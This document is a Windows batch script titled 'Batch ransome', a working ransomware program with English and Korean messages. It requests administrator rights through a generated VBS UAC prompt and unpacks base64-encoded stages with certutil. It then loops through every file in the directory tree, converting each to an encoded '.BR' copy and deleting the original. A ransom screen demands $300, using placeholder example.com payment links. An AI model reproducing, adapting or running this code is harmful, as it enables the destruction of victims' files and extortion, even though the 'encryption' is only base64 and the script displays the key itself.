@echo off
cd C:\users\user\desktop
powershell "$wshell = New-Object -ComObject wscript.shell; $wshell.SendKeys({F11})"
>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"

if '%errorlevel%' NEQ '0' (

    echo 관리 권한을 요청 ...

    goto UACPrompt

) else ( goto gotAdmin )

:UACPrompt

    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"

    set params = %*:"=""

    echo UAC.ShellExecute "cmd.exe", "/c %~s0 %params%", "", "runas", 1 >> "%temp%\getadmin.vbs"



    "%temp%\getadmin.vbs"

    rem del "%temp%\getadmin.vbs"

    exit /B



:gotAdmin

pushd "%CD%"

    CD /D "%~dp0"
@shift /0
@echo off
cd %userprofile%\desktop
goto :11


:11
cd %userprofile%\desktop

:BRr
cd %temp%
echo timeout 5 /nobreak>exit.bat
echo del /f /q "%userprofile%\Desktop\%~n0%~x0.BR">>exit.bat
echo copy "%temp%\BRr.bat" "%userprofile%\Desktop\%~n0%~x0">>exit.bat
echo del /f /q "%temp%BRr.bat">>exit.bat
echo exit>>exit.bat
start /min exit.bat
cd %userprofile%\Desktop
copy "%~n0%~x0" "%temp%\BRr.bat">nul
cd "%userprofile%\Desktop"
if exist "*.BR" goto main
echo QGVjaG8gb2ZmCjptYWluCmNkICIldGVtcCUiCnNldCBrZXkxPSVyYW5kb20lJXJhbmRvbSUKZWNobyAla2V5MSU+cGMudHh0CmNlcnR1dGlsIC9lbmNvZGUgcGMudHh0IHAudHh0ICYmIGZpbmRzdHIgL3YgL2M6LSBwLnR4dD5rZXkudHh0CmZvciAvZiAidG9rZW5zPSoiICUlQSBpbiAoa2V5LnR4dCkgZG8gKApzZXQgcGVyc2VuZXJrZXk9JSVBCikKZGVsIC9xIHBjLnR4dApkZWwgL3EgcC50eHQKZGVsIC9xIGtleS50eHQKCgo6bmV4dApjbHMKY29sb3IgNDcKdGl0bGUgQmF0Y2ggcmFuc29tZQpzZXQgYWFhPTAKCmVjaG8uCmVjaG8uCmVjaG8gICAgICAgICAgICAgICBPb3BzISBZb3VyIGZpbGUgaXMgZW5jcnlwdGVkLgplY2hvICAgICAgICAgICAgICAtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCmVjaG8gICAgICAgICAgICAgICBFbmdsaXNoLiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAplY2hvICAgICAgICAgICAgICAgT29wcyEgWW91ciBmaWxlIGlzIGVuY3J5cHRlZC4gICAgICAgICAgICAgICAgICAgICAgICAgCmVjaG8uICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCmVjaG8gICAgICAgICAgICAgIFEgSG93IGRvIHlvdSByZWNvdmVyPyAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKZWNobyAgICAgICAgICAgICAgQSByZWNvdmVyeSBrZXkgaXMgcmVxdWlyZWQgZm9yIHJlY292ZXJ5LiAgICAgICAgICAgIAplY2hvICAgdGltZSAgICAgICBUbyBnZXQgdGhlIHJlY292ZXJ5IGtleSwgICAgICAgICAgICAgICAgICAgICAgICAgICAgCmVjaG8gICAldGltZSUgICAgIHlvdSBjYW4gcHVyY2hhc2UgYSBrZXkgd29ydGggMzAwICQuICAgICAgICAgICAgICAgICAKZWNoby4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKZWNobyAgICAgICAgICAgICAgUSBXaGVyZSB0byBidXk/ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKZWNobyAgICAgICAgICAgICAgIFByZXNzIGFueSBrZXkgYW5kIGVudGVyIGJ1eSB0byBhdXRvbWF0aWNhbGx5IGdvIHRvIAplY2hvICAgICAgICAgICAgICB0aGUga2V5IHB1cmNoYXNlIHNjcmVlbi4gICAgICAgICAgICAgICAgICAgICAgICAgICAgIAplY2hvLgplY2hvLgplY2hvICAgICAgICAgICAgICBRIEkgaGF2ZSBhbm90aGVyIHF1ZXN0aW9uLiAgICAgICAgICAgICAgICAgICAgICAgICAgIAplY2hvICAgICAgICAgICAgICBBIFR5cGUgcSB0byBnbyB0byB0aGUgcXVlc3Rpb24gc2l0ZS4gICAgICAgICAgICAgICAgIAplY2hvLgplY2hvICAgICAgICAgICAgICBRIFRoZXJlIGlzIGEgZGVsYXkgdW50aWwgaW5wdXQuICAgICAgICAgICAgICAgICAgICAgIAplY2hvICAgICAgICAgICAgICBBIElmIGlucHV0IGZhaWxzIG1vcmUgdGhhbiA1IHRpbWVzLCAgICAgICAgICAgICAgICAgIAplY2hvICAgICAgICAgICAgICB0aGUgdGltZSB3aWxsIGJlIGRlbGF5ZWQuICAgCmVjaG8uCmVjaG8gICAgICAgICAgICAgIFEgV2hhdCBpcyBSZWNvdmVyIGtleT8gICAgICAgICAgICAgICAgICAgICAgICAgCmVjaG8gICAgICAgICAgICAgIEEgUmVjb3ZlciBrZXkgaXMgJXBlcnNlbmVya2V5JS4KZWNobyAgICAgICAgICAgICAgRG8gbm90IGZvcmdldCB0aGlzLgplY2hvICAgICAgICAgICAgICAtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQplY2hvICAgICAgICAgICAgICDH0bG5vu4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAplY2hvICAgICAgICAgICAgICC/8726ISC0573FwMcgwd+/5MfRIMbEwM/AzCC+z8ijyK0gtce++r3AtM+02S4gICAgICAgIAplY2hvICAgICAgICAgICAgICBRIL7utruw1CC6ubG4x9W0z7HuPyAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAplY2hvICAgICAgICAgICAgICBBILq5sbggxbC0wiC6ubG4v6Egx8q/5MfVtM+02S4gurmxuCDFsLimIL7ywLi3wbjpICAgIAplY2hvICAgICAgICAgICAgICAzMDAgJMDHIMWwuKYgsbjA1MfSILz2IMDWvcC0z7TZLiAgICAgICAgICAgICAgICAgICAgIAplY2hvLgplY2hvICAgICAgICAgICAgICBRIL7utfC8rSDFsLimILG4wNTH1bTPse4/ICAgICAgICAgICAgICAgICAgICAgICAgICAgIAplY2hvICAgICAgICAgICAgICBBIL7GuasgxbCzqiC0qbijsO0gYnV5uKYgwNS3wsfPuOkgwNq1v8C4t84gwMy1v8fVtM+02QplY2hvLgplY2hvICAgICAgICAgICAgICBRILTZuKUgwfq5rsDMIMDWvcC0z7TZLiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAplY2hvICAgICAgICAgICAgICBBIMH6ua4gu+fAzMaut84gwMy1v8fPt8G46SBxuKYgwNS3wsfPvcq9w7/ALiAgICAgIAplY2hvLgplY2hvICAgICAgICAgICAgICBRILq5sbggxNq15bChILmrvvnAzrChv+Q/CmVjaG8gICAgICAgICAgICAgIEEgurmxuCDE2rXltMIgJXBlcnNlbmVya2V5JSDA1LTPtNkuCmVjaG8gICAgICAgICAgICAgIMfYtOcgxbC4piDA2L7uufa4rrTCILDmv+wsILq5sbiwoSC60rChtMkgx9W0z7TZLgplY2hvLgplY2hvLgplY2hvLgplY2hvLgplY2hvICAgICAgICAgICAgICAgICAgICAgICAgIFByZXNzIGFueSBrZXkgdG8gZW50ZXIKZWNoby4KZWNobyAgICAgICAgICAgICAgICAgICAgICDA1LfCx8+3wbjpIL7GuavFsLOqILStt6/B1ry8v+QKcGF1c2U+bnVsCnNldCAvcCBrZXk9ZW50ZXI6CmlmICVrZXklPT1idXkgZ290byBidXkKaWYgJWtleSU9PXEgZ290byBxCmlmICVrZXklPT0la2V5MSUgZ290byB1bmxvY2sKOmEKZWNobyAgICAgICAgICAgICAgIFRoZSBjb2RlIGlzIHdyb25nLiBwcmVzcyBhbnkga2V5CmVjaG8gICAgICAgICAgICAgxNq15bChIMDfuPi1x776vcC0z7TZLiC+xrmrxbCzqiC0rbevwda8vL/kCnBhdXNlPm51bApnb3RvIG5leHQKCjpidXkKc3RhcnQgaHR0cHM6Ly9leGFtcGxlLmNvbQplY2hvICAgICAgICAgICAgICAgICAgICBJdCB3aWxsIGF1dG9tYXRpY2FsbHkgZW50ZXIgdGhlIHNpdGUuCmVjaG8gICAgICAgICAgICAgICAgIElmIHRoZSBzaXRlIGRvZXMgbm90IHdvcmssIHBsZWFzZSBlbnRlciB0aGUgc2l0ZQplY2hvICAgICAgICAgICAgaHR0cHM6Ly9leGFtcGxlLmNvbQplY2hvLgplY2hvICAgICAgICAgICAgICAgICAgICAgwNq1v8C4t84gu+fAzMauv6Egtem+7rChIMH9tM+02QplY2hvICAgICAgICAgICAgICAgICAgICAguLi+4CC758DMxq6woSC16b7usKHB9sH2IL7KwLuw5r/sCmVjaG8gIGh0dHBzOi8vZXhhbXBsZS5jb20gu+fAzMauv6EgvPa1v8C4t84gtem+7rChvLy/5AplY2hvLgplY2hvLgplY2hvICAgICAgICAgICAgICAgICAgICAgUHJlc3MgYW55IGtleSB0byByZXR1cm4gdG8gdGhlIGZpcnN0IHNjcmVlbgplY2hvICAgICAgICAgICAgICAgICAgICAgw7kgyK246cC4t84gtbm+xrCht8G46SC+xrmrxbCzqiC0rbevwda8vL/kLgpwYXVzZT5udWwKZ290byBuZXh0Cgo6cQpzdGFydCBodHRwczovL2V4YW1wbGUuY29tCmVjaG8gICAgICAgICAgICAgICAgICAgIEl0IHdpbGwgYXV0b21hdGljYWxseSBlbnRlciB0aGUgc2l0ZS4KZWNobyAgICAgICAgICAgICAgICAgSWYgdGhlIHNpdGUgZG9lcyBub3Qgd29yaywgcGxlYXNlIGVudGVyIHRoZSBzaXRlCmVjaG8gICAgICAgICAgICAgICAgIGh0dHBzOi8vZXhhbXBsZS5jb20gbWFudWFsbHkKZWNoby4KZWNobyAgICAgICAgICAgICAgICAgICAgIMDatb/AuLfOILvnwMzGrr+hILXpvu6woSDB/bTPtNkKZWNobyAgICAgICAgICAgICAgICAgICAgILi4vuAgu+fAzMausKEgtem+7rChwfbB9iC+ysC7sOa/7AplY2hvICAgICAgIGh0dHBzOi8vZXhhbXBsZS5jb20gu+fAzMauv6EgvPa1v8C4t84gtem+7rChvLy/5AplY2hvLgplY2hvLgplY2hvICAgICAgICAgICAgICAgICAgICAgUHJlc3MgYW55IGtleSB0byByZXR1cm4gdG8gdGhlIGZpcnN0IHNjcmVlbgplY2hvICAgICAgICAgICAgICAgICAgICAgw7kgyK246cC4t84gtbm+xrCht8G46SC+xrmrxbCzqiC0rbevwda8vL/kLgpwYXVzZT5udWwKZ290byBuZXh0Cgo6dW5sb2NrCmNscwpjb2xvciA2NwplY2hvICAgICAgICAgICAgICAgUmVzdG9yaW5nIC4uLgplY2hvICAgICAgICAgICAgICAtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KZWNobyAgICAgICAgICAgICAgICAgICBFbmdsaXNoLiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCmVjaG8uCmVjaG8uCmVjaG8uCmVjaG8uCmVjaG8uCmVjaG8uCmVjaG8gICAgICAgdGltZSAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKZWNobyAgICAgICV0aW1lJSAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAplY2hvICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgUmVzdG9yaW5nIC4uLiAgICAgICAgICAgICAgICAgICAgICAgICAKZWNoby4KZWNoby4KZWNoby4KZWNoby4KZWNoby4KZWNoby4KZWNoby4KZWNoby4KZWNobyAgICAgICAgICAgICAgIC0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCmVjaG8gICAgICAgICAgICAgICDH0bG5vu4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAplY2hvLgplY2hvLgplY2hvLgplY2hvLgplY2hvLgplY2hvLgplY2hvICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgurmxuMHfLi4uICAgICAgICAgICAgICAgICAgICAgICAKZWNoby4KZWNoby4KZWNoby4KZWNoby4KZWNoby4KZWNoby4KZWNobyAgICAgICAgICAgICAgLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQpkZWwgYS52YnMKY2VydHV0aWwgLWRlY29kZSAldGVtcCVccmVjb3ZlciAldGVtcCVccmVjb3Zlci5iYXQKc3RhcnQgL21heCAldGVtcCVccmVjb3Zlci5iYXQ= > %temp%\main
certutil -decode "%temp%\main" "%temp%\main.bat"
start /max %temp%\main.bat
echo QGVjaG8gb2ZmCigKZWNobyBRR1ZqYUc4Z2IyWm1DblJwZEd4bElPdXp0ZXExckFwamIyeHZjaUEyTndwbFkyaHZJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ1VtVnpkRzl5YVc1bklDNHVMZ3BsWTJodklDQWdJQ0FnSUNBZ0lDQWdJQ0F0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzBLWldOb2J5QWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQkZibWRzYVhOb0xpQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnQ21WamFHOHVDbVZqYUc4dUNtVmphRzh1Q21WamFHOHVDbVZqYUc4dUNtVmphRzh1Q21WamFHOGdJQ0FnSUNBZ2RHbHRaU0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FLWldOb2J5QWdJQ0FnSUNWMGFXMWxKU0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUFwbFkyaHZJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnVW1WemRHOXlhVzVuSUM0dUxpQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBS1pXTm9ieTRLWldOb2J5NEtaV05vYnk0S1pXTm9ieTRLWldOb2J5NEtaV05vYnk0S1pXTm9ieTRLWldOb2J5NEtaV05vYnlBZ0lDQWdJQ0FnSUNBZ0lDQWdJQzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRDbVZqYUc4Z0lDQWdJQ0FnSUNBZ0lDQWdJQ0R0bFp6cXRhM3NsclFnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUFwbFkyaHZMZ3BsWTJodkxncGxZMmh2TGdwbFkyaHZMZ3BsWTJodkxncGxZMmh2TGdwbFkyaHZJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWc2N08xNnJXczdLU1JMaTR1SUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQUtaV05vYndwbFkyaHZMZ3BsWTJodkxncGxZMmh2TGdwbFkyaHZMZ3BsWTJodkxncGxZMmh2SUNBZ0lDQWdJQ0FnSUNBZ0lDQXRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRDbU5rSUNJbGRHVnRjQ1VpQ20xa0lIUmxiWEFLWTJRZ0lpVjFjMlZ5Y0hKdlptbHNaU1ZjWkdWemEzUnZjQ0lLWTJ4ekNtTnZjSGtnSWlvdUtpSWdJaVYwWlcxd0pWeDBaVzF3SWdwa1pXd2dMM0VnSWlWMFpXMXdKVngwWlcxd1hDb3VRbUYwWTJoU1lXNXpiMjFsSWdwamJITUtabTl5SUM5bUlDSjBiMnRsYm5NOUtpSWdKU1ZCSUdsdUlDZ25aR2x5SUM5aUlDOXpJQzloTFdndFpDY3BJR1J2SUNnS1kyVnlkSFYwYVd3Z0xXUmxZMjlrWlNBaUpTVitRU0lnSWlVbGZuQkJYQ1VsZm01QkxpSStiblZzQ21SbGJDQXZjU0FpSlNWK1FTSStiblZzQ21WamFHOGdVM1ZqWTJWemN5QTZJQ1VsZmtFS0tRcHRiM1psSUNJbGRHVnRjQ1ZjZEdWdGNGd3FMaW9pSUNJbGRYTmxjbkJ5YjJacGJHVWxYR1JsYzJ0MGIzQWlDbVY0YVhRPQopID4gJXRlbXAlXEJScgpjZXJ0dXRpbCAtZGVjb2RlICV0ZW1wJVxCUnIgQlJyZS5iYXQKc3RhcnQgL21heCBCUnJlLmJhdApkZWwgL3EgIiV1c2VycHJvZmlsZSVcQXBwRGF0YVwlfm4wJX54MCIKCmRlbCAldXNlcnByb2ZpbGUlXERlc2t0b3BcKi5iYWNocmFuc29tZSogPm51bCAyPiYxCm1vdmUgJXVzZXJwcm9maWxlJVxBcHBEYXRhXGJhY2hyYW5zb21lKi4qICV1c2VycHJvZmlsZSVcRGVza3RvcCA+bnVsIDI+JjEKZGVsICVhcHBkYXRhJVxNaWNyb3NvZnRcV2luZG93c1xTdGFydCBNZW51XFByb2dyYW1zXFN0YXJ0dXBcc291cmNlLmJhdApjb2xvciAyNwpjbHMKZWNobyAgICAgICAgICAgICAgIFJlY292ZXJ5IGNvbXBsZXRlCmVjaG8gICAgICAgICAgICAgICAtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KZWNobyAgICAgICAgICAgICAgIEVuZ2xpc2guICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKZWNoby4KZWNoby4KZWNoby4KZWNoby4KZWNoby4KZWNoby4KZWNoby4KZWNoby4KZWNoby4KZWNobyAgICAgICAgICAgICAgICAgICAgICAgICAgICBSZWNvdmVyeSBjb21wbGV0ZSAgICAgICAgICAgICAgICAgICAgICAgICAKZWNoby4KZWNoby4KZWNoby4KZWNoby4KZWNoby4KZWNoby4KZWNoby4KZWNobyAgICAgICAgICAgICAgIC0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCmVjaG8gICAgICAgICAgICAgICDH0bG5vu4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAplY2hvLgplY2hvLgplY2hvLgplY2hvLgplY2hvLgplY2hvLgplY2hvICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgurmxuCC/z7fhICAgICAgICAgICAgICAgICAgICAgICAKZWNoby4KZWNoby4KZWNoby4KZWNoby4KZWNoby4KZWNoby4KZWNobyAgICAgICAgICAgICAgLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KZWNoby4KZWNoby4KZWNobyAgICAgICAgICAgICAgIFJlY292ZXJ5IGlzIGNvbXBsZXRlLiBQcmVzcyBhbnkga2V5IHRvIGV4aXQuCmVjaG8gICAgICAgICAgICAgurmxuLChIL/Pt+G1x776vcC0z7TZLiC+xrmrxbCzqiC0qbijuOkgwb634bXLtM+02S4KcmQgJXVzZXJwcm9maWxlJVxBcHBEYXRhXGJhY2hyYW5zb21lID5udWwKcGF1c2U+bnVsCmV4aXQ= > %temp%\recover
For /F "tokens=*" %%A in ('dir /b /s /a-d-h') do (
    certutil /encode "%%~A" "lock.txt" && findstr /v /c:- lock.txt>"%%~A.BR"
    Del /f /s /q "lock.txt"
    Del /f /s /q "%%~A"
) >nul
exit

:main
cd "%temp%"
set key1=%random%%random%
echo %key1%>pc.txt
certutil /encode pc.txt p.txt && findstr /v /c:- p.txt>key.txt
for /f "tokens=*" %%A in (key.txt) do (
set persenerkey=%%A
)
del /q pc.txt
del /q p.txt
del /q key.txt


:next
cls
color 47
title Batch ransome
set aaa=0

echo.
echo.
echo               Oops! Your file is encrypted.
echo              ----------------------------------------------------
echo               English.                                             
echo               Oops! Your file is encrypted.                         
echo.                                                                  
echo              Q How do you recover?                               
echo              A recovery key is required for recovery.            
echo   time       To get the recovery key,                            
echo   %time%     you can purchase a key worth 300 $.                 
echo.                                                                  
echo              Q Where to buy?                                      
echo               Press any key and enter buy to automatically go to 
echo              the key purchase screen.                             
echo.
echo.
echo              Q I have another question.                           
echo              A Type q to go to the question site.                 
echo.
echo              Q There is a delay until input.                      
echo              A If input fails more than 5 times,                  
echo              the time will be delayed.   
echo.
echo              Q What is Recover key?                         
echo              A Recover key is %persenerkey%.
echo              Do not forget this.
echo              -----------------------------------------------------
echo              한국어                                               
echo              웁스! 당신의 중요한 파일이 암호화 되었습니다.        
echo              Q 어떻게 복구합니까?                                 
echo              A 복구 키는 복구에 필요합니다. 복구 키를 얻으려면    
echo              300 $의 키를 구입할 수 있습니다.                     
echo.
echo              Q 어디서 키를 구입합니까?                            
echo              A 아무 키나 누르고 buy를 입력하면 자동으로 이동합니다
echo.
echo              Q 다른 질문이 있습니다.                              
echo              A 질문 사이트로 이동하려면 q를 입력하십시오.      
echo.
echo              Q 복구 코드가 무엇인가요?
echo              A 복구 코드는 %persenerkey% 입니다.
echo              해당 키를 잊어버리는 경우, 복구가 불가능 합니다.
echo.
echo.
echo.
echo.
echo                         Press any key to enter
echo.
echo                      입력하려면 아무키나 눌러주세요
pause>nul
set /p key=enter:
if %key%==buy goto buy
if %key%==q goto q
if %key%==%key1% goto unlock
:a
echo               The code is wrong. press any key
echo             코드가 잘못되었습니다. 아무키나 눌러주세요
pause>nul
goto next

:buy
start https://example.com
echo                    It will automatically enter the site.
echo                 If the site does not work, please enter the site
echo            https://example.com
echo.
echo                     자동으로 사이트에 들어가 집니다
echo                     만약 사이트가 들어가지지 않을경우
echo  https://example.com 사이트에 수동으로 들어가세요
echo.
echo.
echo                     Press any key to return to the first screen
echo                     첫 화면으로 돌아가려면 아무키나 눌러주세요.
pause>nul
goto next

:q
start https://example.com
echo                    It will automatically enter the site.
echo                 If the site does not work, please enter the site
echo                 https://example.com manually
echo.
echo                     자동으로 사이트에 들어가 집니다
echo                     만약 사이트가 들어가지지 않을경우
echo      https://example.com 사이트에 수동으로 들어가세요
echo.
echo.
echo                     Press any key to return to the first screen
echo                     첫 화면으로 돌아가려면 아무키나 눌러주세요.
pause>nul
goto next

:unlock
cls
color 67
echo               Restoring ...
echo              ------------------------------------------------------
echo                   English.                                         
echo.
echo.
echo.
echo.
echo.
echo.
echo       time                                                       
echo      %time%                                                         
echo                              Restoring ...                         
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo               -----------------------------------------------------
echo               한국어                                               
echo.
echo.
echo.
echo.
echo.
echo.
echo                                    복구중...                       
echo.
echo.
echo.
echo.
echo.
echo.
echo              -------------------------------------------------------
del a.vbs

(
echo QGVjaG8gb2ZmCnRpdGxlIOuzteq1rApjb2xvciA2NwplY2hvICAgICAgICAgICAgICAgUmVzdG9yaW5nIC4uLgplY2hvICAgICAgICAgICAgICAtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KZWNobyAgICAgICAgICAgICAgICAgICBFbmdsaXNoLiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCmVjaG8uCmVjaG8uCmVjaG8uCmVjaG8uCmVjaG8uCmVjaG8uCmVjaG8gICAgICAgdGltZSAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKZWNobyAgICAgICV0aW1lJSAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAplY2hvICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgUmVzdG9yaW5nIC4uLiAgICAgICAgICAgICAgICAgICAgICAgICAKZWNoby4KZWNoby4KZWNoby4KZWNoby4KZWNoby4KZWNoby4KZWNoby4KZWNoby4KZWNobyAgICAgICAgICAgICAgIC0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCmVjaG8gICAgICAgICAgICAgICDtlZzqta3slrQgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAplY2hvLgplY2hvLgplY2hvLgplY2hvLgplY2hvLgplY2hvLgplY2hvICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg67O16rWs7KSRLi4uICAgICAgICAgICAgICAgICAgICAgICAKZWNobwplY2hvLgplY2hvLgplY2hvLgplY2hvLgplY2hvLgplY2hvICAgICAgICAgICAgICAtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCmNkICIldGVtcCUiCm1kIHRlbXAKY2QgIiV1c2VycHJvZmlsZSVcZGVza3RvcCIKY2xzCmNvcHkgIiouKiIgIiV0ZW1wJVx0ZW1wIgpkZWwgL3EgIiV0ZW1wJVx0ZW1wXCouQmF0Y2hSYW5zb21lIgpjbHMKZm9yIC9mICJ0b2tlbnM9KiIgJSVBIGluICgnZGlyIC9iIC9zIC9hLWgtZCcpIGRvICgKY2VydHV0aWwgLWRlY29kZSAiJSV+QSIgIiUlfnBBXCUlfm5BLiI+bnVsCmRlbCAvcSAiJSV+QSI+bnVsCmVjaG8gU3VjY2VzcyA6ICUlfkEKKQptb3ZlICIldGVtcCVcdGVtcFwqLioiICIldXNlcnByb2ZpbGUlXGRlc2t0b3AiCmV4aXQ=
) > %temp%\BRr
certutil -decode %temp%\BRr BRre.bat
start /max BRre.bat
del /q "%userprofile%\AppData\%~n0%~x0"

del %userprofile%\Desktop\*.bachransome* >nul 2>&1
move %userprofile%\AppData\bachransome*.* %userprofile%\Desktop >nul 2>&1
del %appdata%\Microsoft\Windows\Start Menu\Programs\Startup\source.bat
color 27
cls
echo               Recovery complete
echo               ------------------------------------------------------
echo               English.                                         
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo                            Recovery complete                         
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo               -----------------------------------------------------
echo               한국어                                               
echo.
echo.
echo.
echo.
echo.
echo.
echo                                    복구 완료                       
echo.
echo.
echo.
echo.
echo.
echo.
echo              --------------------------------------------------------
echo.
echo.
echo               Recovery is complete. Press any key to exit.
echo             복구가 완료되었습니다. 아무키나 누르면 종료됩니다.
rd %userprofile%\AppData\bachransome >nul
pause>nul
exit
